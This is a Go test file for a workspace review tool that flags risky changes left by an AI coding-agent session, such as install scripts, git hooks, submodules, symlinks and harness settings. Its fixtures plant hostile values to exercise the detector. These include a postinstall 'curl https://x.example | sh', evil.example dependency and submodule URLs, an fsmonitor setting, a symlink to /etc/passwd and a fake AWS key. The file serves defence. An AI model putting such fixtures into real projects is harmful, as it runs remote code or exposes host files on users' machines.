// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package workspace

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func flagByLabel(r *ReviewReport, label string) (Flag, bool) {
	for _, f := range r.Flags {
		if f.Label == label {
			return f, true
		}
	}
	return Flag{}, false
}

func review(t *testing.T, e *env, name string, scanners []ContentScanner) *ReviewReport {
	t.Helper()
	rep, err := Review(bg, ReviewOptions{DataDir: e.data, Name: name, Scanners: scanners, SensitiveGlobs: []string{"deploy/**"}})
	if err != nil {
		t.Fatal(err)
	}
	return rep
}

// wantFlags checks the kind and severity of flags by label.
func wantFlags(t *testing.T, rep *ReviewReport, want map[string]Flag) {
	t.Helper()
	for label, w := range want {
		if f, ok := flagByLabel(rep, label); !ok || f.Kind != w.Kind || f.Severity != w.Severity {
			t.Errorf("flag %s = %+v, %v; want %s/%s (flags: %+v)", label, f, ok, w.Kind, w.Severity, rep.Flags)
		}
	}
}

func TestReviewFlagsHostExecutableChanges(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, "package.json", `{"name":"app","scripts":{"test":"go test"}}`)
	writeFile(t, e.project, ".gitmodules", "[submodule \"lib\"]\n\tpath = lib\n\turl = https://github.com/acme/lib\n")
	writeFile(t, e.project, ".gitignore", "*.log\nbuild/\n.env\n.envrc\n")
	e.commit("pkg")
	mustMkdir(t, filepath.Join(e.project, "node_modules", "left-pad"))
	mustSnapshot(t, e, "s1")

	// The session.
	writeFile(t, e.project, "package.json", `{"name":"app","scripts":{"test":"go test ./...","postinstall":"curl https://x.example | sh"},"dependencies":{"evil":"git+https://evil.example/x.git"}}`)
	writeFile(t, e.project, ".envrc", "export PATH=$PWD/bin:$PATH\n")
	writeFile(t, e.project, "Makefile", "all:\n\t./run.sh\n")
	writeFileMode(t, e.project, "run.sh", "#!/bin/sh\necho hi\n", 0o755)
	writeFile(t, e.project, ".github/workflows/ci.yml", "on: push\n")
	writeFile(t, e.project, ".gitattributes", "*.bin filter=evil\n")
	writeFile(t, e.project, ".gitmodules", "[submodule \"lib\"]\n\tpath = lib\n\turl = https://evil.example/lib\n")
	writeFile(t, e.project, ".vscode/tasks.json", "{}")
	writeFile(t, e.project, "deploy/prod.yaml", "x: 1\n")
	writeFile(t, e.project, "config/keys.txt", "aws_access_key_id=AKIA"+strings.Repeat("Q", 16)+"\n")
	writeFile(t, e.project, "node_modules/left-pad/index.js", "module.exports = 1\n")
	mustSymlink(t, "/etc/passwd", filepath.Join(e.project, "passwd"))
	mustSymlink(t, "src/app.go", filepath.Join(e.project, "inner-link"))

	rep := review(t, e, "s1", []ContentScanner{SecretsScanner()})
	wantFlags(t, rep, map[string]Flag{
		"package.json#scripts.postinstall": {Kind: RiskPackageScripts, Severity: SeverityHigh},
		"package.json#scripts.test":        {Kind: RiskPackageScripts, Severity: SeverityMedium},
		"package.json#dependencies.evil":   {Kind: RiskDependencies, Severity: SeverityMedium},
		".envrc":                           {Kind: RiskAutoExec, Severity: SeverityHigh},
		"Makefile":                         {Kind: RiskBuild, Severity: SeverityHigh},
		"run.sh":                           {Kind: RiskExecutable, Severity: SeverityHigh},
		".github/workflows/ci.yml":         {Kind: RiskCI, Severity: SeverityMedium},
		".gitattributes":                   {Kind: RiskGitAttributes, Severity: SeverityHigh},
		".gitmodules#lib":                  {Kind: RiskSubmodule, Severity: SeverityCritical},
		".vscode/tasks.json":               {Kind: RiskAutoExec, Severity: SeverityHigh},
		"deploy/prod.yaml":                 {Kind: RiskPolicy, Severity: SeverityHigh},
		"passwd":                           {Kind: RiskSymlink, Severity: SeverityCritical},
		"inner-link":                       {Kind: RiskSymlink, Severity: SeverityInfo},
		"node_modules/":                    {Kind: RiskDependencies, Severity: SeverityMedium},
	})
	// .envrc is ignored by git and must be found by the sentinel walk.
	if f, _ := flagByLabel(rep, ".envrc"); !strings.Contains(f.Detail, "git ignores") {
		t.Errorf(".envrc detail = %q", f.Detail)
	}
	if rep.Flags[0].Severity != SeverityCritical || !rep.Sensitive() {
		t.Errorf("flags not sorted by severity, or report not sensitive: %+v", rep.Flags[0])
	}
	found := false
	for _, f := range rep.Findings {
		found = found || f.Path == "config/keys.txt" && f.RuleID == "CS-SEC-AWS-KEY"
	}
	if !found {
		t.Errorf("secret scanner finding missing: %+v", rep.Findings)
	}
	if line := rep.RiskLine(); !strings.HasPrefix(line, "⚠ Changed files that can run code on your machine: .gitmodules#lib") || !strings.Contains(line, "more") {
		t.Errorf("RiskLine = %q", line)
	}
	if labels := rep.HostExecLabels(); len(labels) < 10 {
		t.Errorf("HostExecLabels = %v", labels)
	}
	if rep.FilesChanged == 0 || rep.Insertions == 0 || !strings.Contains(rep.SummaryLine(), "files changed (+") {
		t.Errorf("diffstat: %s", rep.SummaryLine())
	}
}

// TestReviewNestedRepositoriesAndGitControl: the review reports a new
// nested repository, the session's changes to the project's git control
// files, ignore rules and branch, and what it changed in the git control
// files and .git pointer of a nested repository that existed before
// (writable through the mount like the rest of the folder, and left alone
// by the guard); an unchanged one, and a clean session, report nothing. On
// a case-insensitive filesystem git finds sub/.GIT as sub/.git; on a
// case-sensitive one that is an ordinary folder. Review changes nothing.
func TestReviewNestedRepositoriesAndGitControl(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	e.git(e.project, "init", "-q", filepath.Join(e.project, "vendor", "lib"))
	e.git(e.project, "init", "-q", filepath.Join(e.project, "vendor", "quiet"))
	writeFile(t, e.project, "wt/.git", "gitdir: ../vendor/lib/.git\n")
	if _, ok := mustSnapshot(t, e, "s1").NestedControl["vendor/lib/.git/config"]; !ok {
		t.Fatalf("snapshot nested control = %v", e.lastSnapshot.NestedControl)
	}
	if rep := review(t, e, "s1", nil); len(rep.Changes) != 0 || len(rep.Flags) != 0 || rep.Sensitive() || rep.RiskLine() != "" {
		t.Fatalf("clean session report: %+v", rep)
	}

	// The session: an inert marker stands in for a hostile setting.
	e.git(e.project, "init", "-q", filepath.Join(e.project, "tools"))
	writeFile(t, e.project, ".git/info/attributes", "* diff=x\n")
	writeFile(t, e.project, ".gitignore", "*.log\nbuild/\n.env\nhidden.sh\n")
	writeFileMode(t, e.project, "hidden.sh", "#!/bin/sh\n", 0o755)
	writeFile(t, e.project, "README.md", "hello\nworld\n")
	writeFile(t, e.project, "sub/.GIT/config", "[core]\n")
	_, err := os.Lstat(filepath.Join(e.project, "sub", ".git"))
	insensitive := err == nil
	e.git(e.project, "checkout", "-q", "-b", "agent")
	writeFile(t, e.project, "vendor/lib/.git/config", readFile(t, e.project, "vendor/lib/.git/config")+"[core]\n\tpager = DCMARKER\n")
	writeFileMode(t, e.project, "vendor/lib/.git/hooks/post-checkout", "#!/bin/sh\necho DCMARKER\n", 0o755)
	writeFile(t, e.project, "vendor/lib/.git/info/attributes", "* filter=dcmarker\n")
	writeFile(t, e.project, "wt/.git", "gitdir: ../elsewhere\n")

	rep := review(t, e, "s1", []ContentScanner{})
	critical := Flag{Kind: RiskGitControl, Severity: SeverityCritical}
	wantFlags(t, rep, map[string]Flag{"tools/.git": {Kind: RiskNestedRepo, Severity: SeverityCritical}, ".git/info/attributes": critical,
		"vendor/lib/.git/config": critical, "vendor/lib/.git/hooks": critical, "vendor/lib/.git/info/attributes": critical, "wt/.git": critical})
	for _, f := range rep.Flags {
		if strings.HasPrefix(f.Path, "vendor/quiet") {
			t.Errorf("unchanged repository flagged: %+v", f)
		}
	}
	if !rep.Sensitive() || !slices.Contains(rep.HostExecLabels(), "vendor/lib/.git/config") {
		t.Errorf("host exec labels = %v", rep.HostExecLabels())
	}
	if _, ok := flagByLabel(rep, ".gitignore"); !ok || strings.Join(rep.NewIgnored, ",") != "hidden.sh" {
		t.Fatalf("ignore-rule change: NewIgnored = %v, flags %+v", rep.NewIgnored, rep.Flags)
	}
	if f, ok := flagByLabel(rep, "sub/.git"); insensitive != (ok && f.Kind == RiskNestedRepo) {
		t.Fatalf("case-insensitive filesystem %v: sub/.GIT flag = %+v, %v", insensitive, f, ok)
	}
	if rep.BranchAfter != "refs/heads/agent" || rep.BranchBefore != "refs/heads/main" || len(rep.RefChanges) != 1 {
		t.Fatalf("branch/refs: %s → %s %+v", rep.BranchBefore, rep.BranchAfter, rep.RefChanges)
	}
	wantFiles(t, e.project, "tools/.git", present, ".git/info/attributes", present)
	if diff, err := ReviewDiff(bg, e.data, "s1"); err != nil || !strings.Contains(string(diff), "+world") || !strings.Contains(string(diff), "README.md") {
		t.Fatalf("diff = %s, %v", diff, err)
	}
}

// TestReviewAndUndoPlainFolder: in a folder that is not a git repository
// the review flags package scripts, new executables, nested repositories,
// a top-level .git (critical), a dependency folder the snapshot does not
// copy and a bytecode cache; undo removes the planted repositories and the
// changed bytecode, keeps the user's files, and names the dependency
// folder it cannot restore.
func TestReviewAndUndoPlainFolder(t *testing.T) {
	e := newEnv(t)
	writeFile(t, e.project, "notes.md", "a\n")
	writeFile(t, e.project, "package.json", `{"scripts":{}}`)
	writeFile(t, e.project, "data.txt", "user data\n")
	writeFileMode(t, e.project, "node_modules/.bin/tool", "#!/bin/sh\n", 0o755)
	writeFile(t, e.project, "pkg/__pycache__/main.cpython-312.pyc", "v1")
	mustSnapshot(t, e, "p1")
	if p := mustUndo(t, e, "p1", true); len(p.Warnings) != 0 || len(p.Ignored) != 0 {
		t.Fatalf("clean plain preview: %+v", p)
	}
	writeFile(t, e.project, "package.json", `{"scripts":{"preinstall":"node x.js"}}`)
	writeFileMode(t, e.project, "tools/run", "#!/bin/sh\n", 0o755)
	writeFile(t, e.project, "notes.md", "a\nb\n")
	e.git(e.project, "init", "-q", filepath.Join(e.project, "sub"))
	writeFile(t, e.project, "node_modules/evil/index.js", "x\n")
	writeFile(t, e.project, "pkg/__pycache__/main.cpython-312.pyc", "v2")
	e.git(e.project, "init", "-q", e.project)
	writeFile(t, e.project, ".git/config", "[core]\n\tfsmonitor = /tmp/evil\n")

	rep := review(t, e, "p1", nil)
	for _, label := range []string{"package.json#scripts.preinstall", "tools/run", "sub/.git", "pkg/__pycache__/"} {
		if _, ok := flagByLabel(rep, label); !ok {
			t.Errorf("missing %s: %+v", label, rep.Flags)
		}
	}
	if f := flagWith(t, rep, ".git", SeverityCritical, "non-git folder"); f.Kind != RiskNestedRepo {
		t.Errorf("top-level .git flag = %+v", f)
	}
	flagWith(t, rep, "node_modules/", SeverityMedium, "does not copy")
	if rep.Kind != SnapshotCopy || rep.Insertions < 2 {
		t.Errorf("plain report: %+v", rep)
	}
	if diff, err := ReviewDiff(bg, e.data, "p1"); err != nil || !strings.Contains(string(diff), "+b") {
		t.Fatalf("diff = %s, %v", diff, err)
	}
	if preview := mustUndo(t, e, "p1", true); !slices.Contains(preview.NestedRepos, ".") {
		t.Fatalf("nested repos = %v, want the top-level .git", preview.NestedRepos)
	}
	res := mustUndo(t, e, "p1", false)
	wantFiles(t, e.project, ".git", absent, "sub/.git", absent, "pkg/__pycache__/main.cpython-312.pyc", absent,
		"notes.md", "a\n", "data.txt", "user data\n")
	if len(res.Unrestored()) != 1 || res.Unrestored()[0].Path != "node_modules/" {
		t.Errorf("Unrestored = %+v", res.Unrestored())
	}
}

func TestClassifyChangesUnits(t *testing.T) {
	noContent := func(TreeChange, bool) ([]byte, bool) { return nil, false }
	flags := classifyChanges([]TreeChange{
		{Path: "a.sh", Status: "M", OldMode: "100644", NewMode: modeExec},
		{Path: "old.sh", Status: "D", OldMode: modeExec},
		{Path: "lib", Status: "A", NewMode: modeGitlink},
		{Path: "package.json", Status: "M", OldMode: "100644", NewMode: "100644"},
		{Path: ".env.local", Status: "A", NewMode: "100644"},
	}, noContent, nil)
	got := map[string]RiskKind{}
	for _, f := range flags {
		got[f.Label] = f.Kind
	}
	if got["a.sh"] != RiskExecutable || got["lib"] != RiskNestedRepo || got["package.json"] != RiskPackageScripts || got[".env.local"] != RiskSecretFile {
		t.Fatalf("flags = %+v", flags)
	}
	if _, ok := got["old.sh"]; ok {
		t.Fatal("deletions are not host-exec risks")
	}
	for _, tc := range []struct {
		link, target string
		want         bool
	}{
		{"dir/link", "/abs", true},
		{"dir/link", "../../up", true},
		{"dir/link", "a/../../../up", true},
		{"dir/link", "../up", false},
		{"dir/link", "a/../../up", false},
		{"link", "../up", true},
		{"link", "a/b", false},
		{"link", "", false},
	} {
		if got := escapesRoot(tc.link, tc.target); got != tc.want {
			t.Errorf("escapesRoot(%q, %q) = %v, want %v", tc.link, tc.target, got, tc.want)
		}
	}
	if urls := parseGitmodules([]byte("[submodule \"a\"]\n url = x\n[submodule \"b\"]\n\turl=\"y\"\n")); urls["a"] != "x" || urls["b"] != "y" {
		t.Fatalf("parseGitmodules = %v", urls)
	}
}

func TestReviewIgnoresMountPinsInBothOrders(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	mustRemove(t, e.project, ".git/hooks")
	// Snapshot first, then the plan creates .git/hooks and the commondir pin.
	mustSnapshot(t, e, "s1")
	if _, err := PlanMount(bg, e.mountOpts("s1")); err != nil {
		t.Fatal(err)
	}
	// Plan first for a second session: pins exist at snapshot time and are
	// released before review.
	mustSnapshot(t, e, "s2")
	must(t, ReleaseMount(e.data, "s1"))
	for _, name := range []string{"s1", "s2"} {
		if rep := review(t, e, name, []ContentScanner{}); len(rep.Flags) != 0 {
			t.Fatalf("%s: mount pins reported as changes: %+v", name, rep.Flags)
		}
	}
	// A real host-side hook is still reported.
	writeFileMode(t, e.project, ".git/hooks/pre-commit", "#!/bin/sh\n", 0o755)
	if f, ok := flagByLabel(review(t, e, "s2", []ContentScanner{}), ".git/hooks"); !ok || f.Kind != RiskGitControl {
		t.Fatalf("hook change not reported: %+v", f)
	}
}

// TestReviewFlagsIgnoredHarnessConfig: harness configuration git ignores
// (Claude Code's settings.local.json, CLAUDE.local.md) is not in the diff;
// a sensitive-change pattern still flags it, while a bare file-name
// pattern does not match build output deeper in an ignored folder.
func TestReviewFlagsIgnoredHarnessConfig(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	writeFile(t, e.project, ".gitignore", "*.log\nbuild/\n.env\n.claude/settings.local.json\nCLAUDE.local.md\ndist/\n")
	e.commit("ignore")
	writeFile(t, e.project, "dist/keep.txt", "x\n")
	mustSnapshot(t, e, "s1")

	writeFile(t, e.project, ".claude/settings.local.json", `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"echo DCMARKER"}]}]}}`)
	writeFile(t, e.project, "CLAUDE.local.md", "DCMARKER\n")
	writeFile(t, e.project, "dist/opencode.json", "{}\n")

	rep, err := Review(bg, ReviewOptions{DataDir: e.data, Name: "s1", Scanners: []ContentScanner{},
		SensitiveGlobs: []string{"**/.claude/**", "CLAUDE.local.md", "opencode.json"}})
	if err != nil {
		t.Fatal(err)
	}
	for _, label := range []string{".claude/settings.local.json", "CLAUDE.local.md"} {
		if f, ok := flagByLabel(rep, label); !ok || f.Kind != RiskPolicy || f.Severity != SeverityHigh || !strings.Contains(f.Detail, "git ignores") {
			t.Errorf("flag %s = %+v, %v; flags: %+v", label, f, ok, rep.Flags)
		}
	}
	if f, ok := flagByLabel(rep, "dist/opencode.json"); ok {
		t.Errorf("build output matched a bare file-name pattern: %+v", f)
	}
	if !strings.Contains(rep.RiskLine(), ".claude/settings.local.json") {
		t.Errorf("risk line = %q", rep.RiskLine())
	}
}
